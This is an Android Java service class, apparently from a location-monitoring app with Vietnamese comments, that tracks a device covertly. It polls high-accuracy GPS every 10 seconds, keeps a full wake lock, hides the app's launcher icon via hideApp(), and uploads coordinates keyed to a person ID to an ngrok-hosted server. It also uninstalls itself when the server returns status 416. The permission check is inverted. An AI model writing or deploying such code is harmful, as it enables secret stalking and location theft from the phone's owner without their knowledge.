package com.example.monitoringlocation.service;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.*;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import com.example.monitoringlocation.LocationData;
import com.example.monitoringlocation.LocationDatabaseHelper;
import com.example.monitoringlocation.MainActivity;
import com.example.monitoringlocation.api.LocationAPI;
import com.google.android.gms.location.*;
import com.google.android.gms.tasks.OnSuccessListener;
import org.joda.time.DateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import java.util.ArrayList;
import java.util.List;

public class ForegroundService extends Service {
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private int countdownTimeRemaining = 0;
    LocationDatabaseHelper dbHelper;

    private static final long UPDATE_INTERVAL = 10000; // 10 giây
    private static final long FASTEST_UPDATE_INTERVAL = 5000; // 5 giây
    private PowerManager.WakeLock wakeLock;

    private FusedLocationProviderClient fusedLocationClient;

    private Handler handler;
    private Runnable runnable;
    private LocationData locationData;

    @Override
    public void onCreate() {
        super.onCreate();
        dbHelper = new LocationDatabaseHelper(getApplicationContext());
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        acquireWakeLock();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Location Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build();

        startForeground(1, notification);
          hideApp();

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED) {
        } else {
            // Tạo một đối tượng LocationRequest để cấu hình yêu cầu vị trí
            LocationRequest locationRequest = LocationRequest.create()
                    .setInterval(10000) // Khoảng thời gian giữa các cập nhật vị trí (10 giây)
                    .setFastestInterval(5000) // Khoảng thời gian tối thiểu giữa các cập nhật vị trí (5 giây)
                    .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY); // Ưu tiên cao nhất cho độ chính xác vị trí

            // Tạo một đối tượng LocationCallback để xử lý kết quả vị trí
            LocationCallback locationCallback = new LocationCallback() {
                @Override
                public void onLocationResult(LocationResult locationResult) {
                    // Lấy thông tin vị trí mới nhất từ kết quả trả về
                    Location location = locationResult.getLastLocation();
                    if (location != null) {
                        double latitude = location.getLatitude();
                        double longitude = location.getLongitude();
                        String time = getCurrentTime();
                        int id = 0;
                        if (intent != null) {
                            id = intent.getIntExtra("idPerson", 0);
                        }
                        locationData = new LocationData(id, time, latitude, longitude);
                        Log.d("=========================>", "" + latitude);
                    }
                }
            };

            // Đăng ký yêu cầu vị trí và callback
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
            Log.d("=========================>", "Khong co quyen yeu cau truy cap vi tri");
        }

        handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                Log.d("=========================>", "sent " + locationData);

                sendLocationToServerPeriodically();
                handler.postDelayed(this, UPDATE_INTERVAL);
            }
        };
        handler.postDelayed(runnable, UPDATE_INTERVAL);


        return START_STICKY;
    }


    @SuppressLint("InvalidWakeLockTag")
    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "LocationServiceWakeLock");
        wakeLock.acquire();
    }

    private void hideApp() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(getApplicationContext(), MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void sendLocationToServerPeriodically() {
        if (isConnectedToInternet() && countdownTimeRemaining == 0) {
            sendLocationInDatabase();
            sendLocationToServer(locationData);
        } else {
            saveLocationToLocalStorage(locationData);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private String getCurrentTime() {
        DateTime currentTime = DateTime.now();
        DateTimeFormatter formatter = DateTimeFormat.forPattern("yyyy-MM-dd'T'HH:mm:ss");
        return currentTime.toString(formatter);
    }

    private boolean isConnectedToInternet() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }

    private void saveLocationToLocalStorage(LocationData locationData) {
        dbHelper.insertLocation(locationData);
        Toast.makeText(getApplicationContext(), "Lưu vị trí vào CSDL cục bộ", Toast.LENGTH_SHORT).show();
    }

    private void sendLocationInDatabase() {
        //check xem data base co du lieu khong, neu co thi se gui du lieu co trong database truoc, sau do xoa
        Cursor cursor = dbHelper.getAllLocations();
        if (cursor != null && cursor.moveToFirst()) {
            int latitudeColumnIndex = cursor.getColumnIndex(LocationDatabaseHelper.COLUMN_LATITUDE);
            int longitudeColumnIndex = cursor.getColumnIndex(LocationDatabaseHelper.COLUMN_LONGITUDE);
            int tokenColumnIndex = cursor.getColumnIndex(LocationDatabaseHelper.COLUMN_TOKEN);
            int timeColumnIndex = cursor.getColumnIndex(LocationDatabaseHelper.COLUMN_TIME);
            List<LocationData> listLocation = new ArrayList<>();

            while (!cursor.isAfterLast()) {
                double latitude = cursor.getDouble(latitudeColumnIndex);
                double longitude = cursor.getDouble(longitudeColumnIndex);
                int token = cursor.getInt(tokenColumnIndex);
                String time = cursor.getString(timeColumnIndex);
                listLocation.add(new LocationData(token, time, latitude, longitude));
                cursor.moveToNext();
            }
            // Khởi tạo Retrofit
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("https://e9ac-113-161-41-79.ngrok-free.app/monitoring-location/api/v1/")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            Toast.makeText(getApplicationContext(), " send database", Toast.LENGTH_SHORT).show();

            // Tạo interface cho các yêu cầu API
            LocationAPI locationAPI = retrofit.create(LocationAPI.class);

            // Thực hiện yêu cầu POST dữ liệu vị trí
            Call<Void> call = locationAPI.sendListLocation(listLocation);
            call.enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    int statusCode = response.code();
                    switch (statusCode) {
                        case 200:
                            Log.d("=========================>", "sent list location thanh cong");
                            Toast.makeText(getApplicationContext(), " Gui thanh cong", Toast.LENGTH_SHORT).show();
                            dbHelper.deleteAllLocations();//xoa data sau khi gui thanh cong
                            break;
                        case 429:
                            Log.d("=========================>", "set Location failed  ====> 429, luu vao csdl");
                            startCountdownTimer();// doi 5p sau tiep tuc call api
                            Toast.makeText(getApplicationContext(), "SERVER 429 ", Toast.LENGTH_SHORT).show();
                            break;
                        case 416: // Xu ly truong hop khong tim thay TABLE -> xoa app
                            Toast.makeText(getApplicationContext(), "UNINSTALL ", Toast.LENGTH_SHORT).show();
                            Log.d("=========================>", "khong tim thay database ====> uninstall");
                            uninstallApp();
                    }
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    // Xử lý lỗi kết nối
                    Toast.makeText(getApplicationContext(), " lỗi kết nối +  loi phan gui database", Toast.LENGTH_SHORT).show();
                }
            });
            cursor.close();
        }
    }


    private void sendLocationToServer(LocationData locationData) {

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://e9ac-113-161-41-79.ngrok-free.app/monitoring-location/api/v1/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        // Tạo interface cho các yêu cầu API
        LocationAPI locationAPI = retrofit.create(LocationAPI.class);
        Call<Void> call = locationAPI.sendLocation(locationData);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                int statusCode = response.code();
                switch (statusCode) {
                    case 200:
                        Toast.makeText(getApplicationContext(), " Gui thanh cong", Toast.LENGTH_SHORT).show();
                        Log.d("=========================>", "set Location thanh cong");
                        break;
                    case 429:
                        // Luu data vao trong sqLite
                        // doi 5p sau tiep tuc call api
                        Log.d("=========================>", "set Location failed  ====> 429, luu vao csdl");
                        startCountdownTimer();
                        saveLocationToLocalStorage(locationData);
                        Toast.makeText(getApplicationContext(), "SERVER 429 ", Toast.LENGTH_SHORT).show();
                        break;
                    case 416: // Xu ly truong hop khong tim thay TABLE -> xoa app
                        Toast.makeText(getApplicationContext(), "UNINSTALL ", Toast.LENGTH_SHORT).show();
                        Log.d("=========================>", "khong tim thay table, uninstall");
                        uninstallApp();
                    default:
                        // luu du lieu vao sqlite
                        Log.d("=========================>", " luu vao csdl");
                        saveLocationToLocalStorage(locationData);
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                // Xử lý lỗi kết nối
                // Luu data vao sqlite
                Toast.makeText(getApplicationContext(), " lỗi kết nối + loi phan gui data", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void startCountdownTimer() {
        countdownTimeRemaining = 5 * 60 * 1000;
        Thread countdownThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    while (countdownTimeRemaining > 0) {
                        Thread.sleep(60000); // Chờ 1 giây
                        countdownTimeRemaining -= 60000; // Giảm thời gian còn lại
                        Log.d("=========================> count down", countdownTimeRemaining + "");

                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        countdownThread.start();
    }

    private void uninstallApp() {
        PackageManager packageManager = getPackageManager();
        String packageName = getPackageName();
        Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
        uninstallIntent.setData(Uri.parse("package:" + packageName));
        uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
        startActivity(uninstallIntent);
    }

}